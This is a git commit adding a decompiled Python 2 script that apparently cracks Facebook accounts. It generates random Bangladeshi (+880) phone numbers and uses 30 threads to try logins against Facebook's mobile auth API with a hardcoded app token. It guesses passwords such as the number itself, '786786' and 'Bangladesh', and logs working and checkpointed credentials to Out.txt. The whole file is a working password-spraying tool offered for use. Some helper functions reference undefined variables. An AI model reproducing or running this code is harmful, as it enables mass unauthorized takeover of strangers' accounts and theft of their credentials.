89f392c6c09cda691e7cd9734906979875d0f242
SYBER404 <89589403+SYBER404@users.noreply.github.com>
2021-11-18 17:06:10 +0700

    Add files via upload

---
+++ MBF_V2/c_n_b.py
@@ -0,0 +1,193 @@
+# uncompyle6 version 3.7.4
+# Python bytecode 2.7 (62211)
+# Decompiled from: Python 2.7.17 (default, Dec  5 2019, 10:45:36) 
+# [GCC 4.2.1 Compatible Android (5220042 based on r346389c) Clang 8.0.7 (https://
+# Embedded file name: /sdcard/RozhakXD/c_n_b.py
+# Compiled at: 2021-07-02 12:56:26
+import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass, requests, mechanize
+os.system('rm -rf .txt')
+for n in range(3000):
+    nmbr = random.randint(1111111, 9999999)
+    sys.stdout = open('.txt', 'a')
+    print nmbr
+    sys.stdout.flush()
+
+try:
+    import requests
+except ImportError:
+    os.system('pip2 install tqdm')
+
+try:
+    import requests
+except ImportError:
+    os.system('pip2 install requests')
+
+try:
+    import mechanize
+except ImportError:
+    os.system('pip2 install mechanize')
+
+import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, mechanize
+from multiprocessing.pool import ThreadPool
+from requests.exceptions import ConnectionError
+from mechanize import Browser
+reload(sys)
+sys.setdefaultencoding('utf8')
+br = mechanize.Browser()
+br.set_handle_robots(False)
+br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
+br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
+br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
+
+def mengetik(z):
+    for e in z + '\n':
+        sys.stdout.write(e)
+        sys.stdout.flush()
+        time.sleep(0.05)
+
+
+def keluar():
+    os.system('echo -e "[\xe2\x9c\x94] Keluar ! " | lolcat')
+    os.sys.exit()
+
+
+def acak(b):
+    w = 'ahtdzjc'
+    d = ''
+    for i in x:
+        d += '!' + w[random.randint(0, len(w) - 1)] + i
+
+    return cetak(d)
+
+
+def cetak(b):
+    w = 'ahtdzjc'
+    for i in w:
+        j = w.index(i)
+        x = x.replace('!%s' % i, '\x1b[%s;1m' % str(31 + j))
+
+    x += '\x1b[0m'
+    x = x.replace('!0', '\x1b[0m')
+    sys.stdout.write(x + '\n')
+
+
+def jalan(z):
+    for e in z + '\n':
+        sys.stdout.write(e)
+        sys.stdout.flush()
+        time.sleep(0.001)
+
+
+from tqdm import tqdm
+
+def load():
+    with tqdm(total=100, desc='Loading ', bar_format='{l_bar}{bar}') as (pbar):
+        for i in range(100):
+            time.sleep(0.03)
+            pbar.update(1)
+
+
+back = 0
+berhasil = []
+cekpoint = []
+oks = []
+okb = []
+id = []
+cpb = []
+cps = []
+done = []
+
+def c_n_b():
+    os.system('clear')
+    os.system('echo -e " __  __ ____  _____\n|  \\/  | __ )|  ___|\n| |\\/| |  _ \\| |_\n| |  | | |_) |  _|\n|_|  |_|____/|_|" | lolcat')
+    os.system('echo -e "\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\n[x] author : rozhak \n[x] fb : fb.com/757953543 \n[x] github : github.com/r0zhak\n\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80"| lolcat')
+    try:
+        k = '+880'
+        print '\x1b[0;92m191\x1b[0;93m-\x1b[0;92m192\x1b[0;93m-\x1b[0;92m193\x1b[0;93m-\x1b[0;92m194\x1b[0;93m-\x1b[0;92m195\x1b[0;93m-\x1b[0;92m196\x1b[0;93m-\x1b[0;92m197\x1b[0;93m-\x1b[0;92m198\x1b[0;93m-\x1b[0;92m199'
+        c = raw_input('\x1b[0;93m[\x1b[0;92m?\x1b[0;93m]\x1b[0;92m Kode\x1b[0;93m :\x1b[0;97m ')
+        idlist = '.txt'
+        for line in open(idlist, 'r').readlines():
+            id.append(line.strip())
+
+    except IOError:
+        os.system('echo -e "[!] File Not Found ! " | lolcat')
+        raw_input('\x1b[0;93m[\x1b[0;92mKembali\x1b[0;93m]')
+        c_n_b()
+
+    xxx = str(len(id))
+    jalan('\x1b[0;93m[\x1b[0;92m\xe2\x9c\x94\x1b[0;93m] \x1b[0;92mTotal Nomor \x1b[0;93m:\x1b[0;97m ' + xxx)
+    time.sleep(1)
+    os.system('echo -e "[\xe2\x9c\x94] Hasil Ok/Cp Tersimpan Di (Out.txt)" | lolcat')
+    os.system('echo -e "\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80" | lolcat')
+
+    def main(arg):
+        user = arg
+        try:
+            os.mkdir('save')
+        except OSError:
+            pass
+
+        try:
+            pass1 = user
+            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+            w = json.load(data)
+            if 'access_token' in w:
+                print '\x1b[0;92m[Ok] ' + k + c + user + ' \x1b[0;91m\xe2\x97\x8f\x1b[0;92m ' + pass1
+                okb = open('Out.txt', 'a')
+                okb.write('[Ok] ' + k + c + user + ' \xe2\x97\x8f ' + pass1 + '\n')
+                okb.close()
+                oks.append(user + pass1)
+            elif 'www.facebook.com' in w['error_msg']:
+                print '\x1b[0;93m[Cp] ' + k + c + user + ' \x1b[0;91m\xe2\x97\x8f\x1b[0;93m ' + pass1
+                cps = open('Out.txt', 'a')
+                cps.write('[Cp] ' + k + c + user + ' \xe2\x97\x8f ' + pass1 + '\n')
+                cps.close()
+                cekpoint.append(user + pass1)
+            else:
+                pass2 = '786786'
+                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                w = json.load(data)
+                if 'access_token' in w:
+                    print '\x1b[0;92m[Ok] ' + k + c + user + ' \x1b[0;91m\xe2\x97\x8f\x1b[0;92m ' + pass2
+                    okb = open('Out.txt', 'a')
+                    okb.write('[Ok] ' + k + c + user + ' \xe2\x97\x8f ' + pass2 + '\n')
+                    okb.close()
+                    oks.append(user + pass2)
+                elif 'www.facebook.com' in w['error_msg']:
+                    print '\x1b[0;93m[Cp] ' + k + c + user + ' \x1b[0;91m\xe2\x97\x8f\x1b[0;93m ' + pass2
+                    cps = open('Out.txt', 'a')
+                    cps.write('[Cp] ' + k + c + user + ' \xe2\x97\x8f ' + pass2 + '\n')
+                    cps.close()
+                    cekpoint.append(user + pass2)
+                else:
+                    pass3 = 'Bangladesh'
+                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                    w = json.load(data)
+                    if 'access_token' in w:
+                        print '\x1b[0;92m[Ok] ' + k + c + user + ' \x1b[0;91m\xe2\x97\x8f\x1b[0;92m ' + pass3
+                        okb = open('Out.txt', 'a')
+                        okb.write('[Ok] ' + k + c + user + ' \xe2\x97\x8f ' + pass3 + '\n')
+                        okb.close()
+                        oks.append(user + pass3)
+                    elif 'www.facebook.com' in w['error_msg']:
+                        print '\x1b[0;93m[Cp] ' + k + c + user + ' \x1b[0;91m\xe2\x97\x8f\x1b[0;93m ' + pass3
+                        cps = open('Out.txt', 'a')
+                        cps.write('[Cp] ' + k + c + user + ' \xe2\x97\x8f ' + pass3 + '\n')
+                        cps.close()
+                        cekpoint.append(user + pass3)
+        except:
+            pass
+
+    p = ThreadPool(30)
+    p.map(main, id)
+    os.system('echo -e "\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80" | lolcat')
+    print '\x1b[0;93m[\x1b[0;92m\xe2\x9c\x94\x1b[0;93m]\x1b[0;92m Selesai\x1b[0;97m...'
+    print '\x1b[0;93m[\x1b[0;92m\xe2\x9c\x94\x1b[0;93m]\x1b[0;97m Total\x1b[0;92m Ok \x1b[0;97m/ \x1b[0;93mCp \x1b[0;97m:\x1b[0;92m ' + str(len(oks)) + '\x1b[0;97m /\x1b[0;93m ' + str(len(cekpoint))
+    os.system('echo -e "\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80" | lolcat')
+    raw_input('\x1b[0;93m[\x1b[0;92mKembali\x1b[0;93m]')
+    os.system('python2 ok.pyc')
+
+
+if __name__ == '__main__':
+    c_n_b()
+# okay decompiling c_n_b.pyc
